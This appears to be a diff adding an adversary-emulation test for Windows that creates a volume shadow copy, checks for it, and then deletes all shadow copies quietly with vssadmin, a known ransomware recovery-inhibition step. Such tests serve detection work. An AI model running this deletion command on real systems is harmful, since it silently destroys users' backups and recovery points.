@@ -1,0 +1,15 @@
+#TechniqueName: Inhibit System Recovery
+#AtomicTestName: Windows - Delete Volume Shadow Copies
+#Language: cmd
+
+#get_prereq_commands
+vssadmin.exe create shadow /for=c:
+
+
+#prereq_commands
+if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+
+
+#commands
+vssadmin.exe delete shadows /all /quiet
+
